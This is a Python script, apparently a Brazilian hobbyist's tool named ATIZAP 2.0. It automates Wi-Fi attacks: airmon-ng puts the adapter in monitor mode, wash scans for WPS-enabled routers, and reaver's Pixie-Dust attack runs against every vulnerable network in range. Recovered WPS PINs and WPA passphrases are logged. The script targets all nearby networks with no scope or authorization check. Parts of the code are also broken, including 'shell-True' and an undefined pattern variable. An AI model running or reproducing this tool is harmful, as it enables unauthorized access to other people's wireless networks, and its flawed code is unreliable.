import re 
import subprocess 
import glob 
import os
import time

arquivo_txt = "wash.txt"

ENDC = '\033[m' # reset
RED = '\033[91m'
GREEN = '\033[92m' 
BLUE = '\033[94m' 
YELLOW = '\033[93m'

lista_bssid = []
lista_canal = []
lista_dbm = []
lista_wps = []
lista_lck = []
lista_vendor = []
lista_essid = []


def wash():
    print(f"[{YELLOW}+{ENDC}]Rodando airmon-ng \n")
    subprocess.run("sudo airmon-ng start wlan1", shell=True, universal_newlines=True, stdout=subprocess.DEVNULL)
    print(f"[{YELLOW}+{ENDC}]airmon-ng concluído \n")
    print(f"[{YELLOW}+{ENDC}]Rodando wash \n")
    subprocess.run("sudo timeout 30s wash -F -i wlan1mon | tee wash.txt", shell=True, universal_newlines=True)
    print(f"[{YELLOW}+{ENDC}]Wash concluído \n")

def limparArquivo_executar():
    print(f"[{YELLOW}+{ENDC}]procurando redes vulneraveis... \n")
    with open(arquivo_txt, 'r') as arquivo:
        for _ in range(2):
            arquivo.readline()
        with open('chipsets.txt', 'r') as chipsets:
            lista_chipsets = [line.strip() for line in chipsets]
        for linha in arquivo:
            if any(chipset in linha for chipset in lista_chipsets):
                partes = linha.split()

                lista_bssid.append(partes[0])
                lista_canal.append(partes[1])
                lista_dbm.append(partes[2])
                lista_wps.append(partes[3])
                lista_lck.append(partes[4])
                lista_vendor.append(partes[5])
                lista_essid.append(partes[6])
                
    print(f"[{YELLOW}+{ENDC}]foi encontrado {len(lista_bssid)} redes com vunerabilidade WPS!! \n")
    redes_bom_dbm = []
    redes_ruim_dbm = []
    

    for i in range(len(lista_essid)):
        if int(lista_dbm[i]) < -75:
            redes_ruim_dbm.append(i)
        else:
            redes_bom_dbm.append(i)
    
    print(f"[{YELLOW}+{ENDC}]Redes com dbm < -75: {len(redes_ruim_dbm)} | Redes com dbm >= -75: {len(redes_bom_dbm)}\n")
    
    for i in redes_bom_dbm:
        print(f"[{YELLOW}lista{ENDC}]-{GREEN} {lista_essid[i]}, {lista_dbm[i]} dBm{ENDC}")
    print("\n")
    
    for i in redes_ruim_dbm:
        print(f"[{YELLOW}lista{ENDC}]- {lista_essid[i]}, {RED}{lista_dbm[i]} dBm{ENDC}")

    
    for i in redes_bom_dbm:
        print(f"[{YELLOW}+{ENDC}]Rodando reaver para a rede:{BLUE} {lista_essid[i]}...\n{ENDC}")
        comando = f"sudo timeout 15s reaver -i wlan1mon -b {lista_bssid[i]} -c {lista_canal[i]} -K 1  > redeB{i}.txt"
        subprocess.run(comando, shell=True, stdout=subprocess.DEVNULL)

        grep = f"grep -i 'WPA PSK' redeB{i}.txt"
        print(f"{GREEN}")
        subprocess.run(grep, shell=True)
        print(f"{ENDC}")

        Parcial = f"grep -i 'Failed to recover WPA key' redeB{i}.txt"
        print(f"{YELLOW}")
        subprocess.run(Parcial, shell=True)
        print(f"{ENDC}")

        nao_acho = f"grep -i 'WPS pin not found!' redeB{i}.txt"
        print(f"{RED}")
        subprocess.run(nao_acho, shell-True)
        print(f"{ENDC}")


    for i in redes_ruim_dbm:
        print(f"[{YELLOW}+{ENDC}]Rodando reaver para a rede:{BLUE} {lista_essid[i]}...\n{ENDC}")
        comando = f"sudo timeout 15s reaver -i wlan1mon -b {lista_bssid[i]} -c {lista_canal[i]} -K 1  > redeR{i}.txt"
        subprocess.run(comando, shell=True, stdout=subprocess.DEVNULL)

        grep = f"grep -i 'WPA PSK' redeR{i}.txt"
        print(f"{GREEN}")
        subprocess.run(grep, shell=True)
        print(f"{ENDC}")

        Parcial = f"grep -i 'Failed to recover WPA key' redeR{i}.txt"
        print(f"{YELLOW}")
        subprocess.run(Parcial, shell=True)
        print(f"{ENDC}")

        nao_acho = f"grep -i 'WPS pin not found!' redeR{i}.txt"
        print(f"{RED}")
        subprocess.run(nao_acho, shell-True)
        print(f"{ENDC}")

#Loucura.inicio()
def analizarResultados():
    pattern0 = re.compile(r"Pixiewps: success: setting pin to")
    pattern1 = re.compile(r"send_packet called from resend_last_packet()")
    pattern2 = re.compile(r"Associated with")
    pattern3 = re.compile(r"WPS PIN:")
    pattern4 = re.compile(r"WPA PSK:")
    pattern5 = re.compile(r"AP SSID:")
    pattern6 = re.compile(r"Failed to recover WPA key")
    pattern8 = re.compile(r"The AP /might be/ vulnerable. Try again")

    for filename in glob.glob("rede*.txt"):
        with open(filename, 'r') as f:
            found_pattern1 = False
            found_pattern2 = False
            found_wps_pin = False
            found_wpa_psk = False
            found_ap_ssid = False
            found_erro_parcial = False
            found_pin_apenas = False
            found_ap_vuln = False
            wps_pin = ""
            wpa_psk = ""
            ap_ssid = ""
            falha_ssid = ""
            erro_por = ""
            erro_parcial = ""
            pin_apenas = ""
            ap_vuln = ""

            for line in f:
                if pattern0.search(line):
                    found_pin_apenas = True
                    pin_apenas = line.strip()

                if pattern6.search(line):
                    found_erro_parcial = True
                    erro_parcial = line.strip()

                if pattern1.search(line):
                    found_pattern1 = True
                    erro_por = line.strip()

                if pattern2.search(line):
                    found_pattern2 = True
                    falha_ssid = line.strip()

                if pattern3.search(line):
                    found_wps_pin = True
                    wps_pin = line.strip()

                if pattern4.search(line):
                    found_wpa_psk = True
                    wpa_psk = line.strip()

                if pattern5.search(line):
                    found_ap_ssid = True
                    ap_ssid = line.strip()

                if pattern7.search(line):
                    found_erro_escroto = True
                    erro_por = line.strip()

                if pattern8.search(line):
                    found_ap_vuln = True
                    ap_vuln = line.strip()



            if found_wps_pin and found_wpa_psk:
                with open('./logs/sucesso.log', 'a') as log:
                    log.write(f"Sucesso em {filename}\n")
                    log.write(f"{wps_pin}\n")
                    log.write(f"{wpa_psk}\n")
                    log.write(f"{falha_ssid}\n")
                    log.write(f"{ap_ssid}\n \n")

            elif found_erro_parcial and found_pin_apenas:
                with open('.logs/falha.log', 'a') as falha_parcial:
                    falha_parcial.write(f"Falha em {filename}")
                    falha_parcial.write(f"FALHA PARCIAL\n")
                    falha_parcial.write(f"Com pin: {pin_apenas}\n")
                    falha_parcial.write(f"O programa não conseguiu recuperar o PSK\n")
                    falha_parcial.write(f"Erro >> '{erro_parcial}\n")
                    falha_parcial.write(f"Tentar recuperar com reaver ou bully")
                    falha_parcial.write(f"SSID: {falha_ssid}\n \n")

            elif found_ap_vuln:
                with open('.logs/falha.log', 'a') as AP_VULN:
                    AP_VULN.write(f"Tentar Denovo\n")
                    AP_VULN.write(f"Com --force ou outro (novo) set de dados\n \n")
                    AP_VULN.write(f"BSSID e SSID: {falha_ssid}")


            else:
                with open('./logs/falha.log', 'a') as falha:
                    falha.write(f"Falha em {filename}\n")
                    if erro_por.strip() == "":
                        falha.write(f"ERRO DESCONHECIDO")
                    else:
                        falha.write(f"Erro >> {erro_por}\n")
                    falha.write(f"SSID: {falha_ssid}\n \n")

#Loucura.fim()

if __name__ == "__main__":
    os.system('clear')
    os.system('rm -fr rede*.txt')
    print(GREEN+"""███████╗ ████████╗██╗███████╗ █████╗ ██████╗ 
██╔══██╗╚══██╔══╝██║╚══███╔╝██╔══██╗██╔══██╗
███████║   ██║   ██║  ███╔╝ ███████║██████╔╝
██╔══██║   ██║   ██║ ███╔╝  ██╔══██║██╔═══╝ 
██║  ██║   ██║   ██║███████╗██║  ██║██║     
╚═╝  ╚═╝   ╚═╝   ╚═╝╚══════╝╚═╝  ╚═╝╚═╝    """)
    print("""
         ██████╗     ██████╗ 
         ╚════██╗   ██╔═████╗
          █████╔╝   ██║██╔██║
         ██╔═══╝    ████╔╝██║
         ███████╗██╗╚██████╔╝
         ╚══════╝╚═╝ ╚═════╝ """+ENDC)
    print(BLUE+"-------------------------------------")
    print("|       Feito por fezin 2024        |")
    print("|                                   |")
    print("|  https://github.com/fezinhopatta  |")
    print("-------------------------------------"+ENDC)
    wash()
    limparArquivo_executar()
    print("Analizando resultados \n")
    analizarResultados()
    os.system('cat ./logs/sucesso.log')
    os.system('./fazedor_backup.sh')
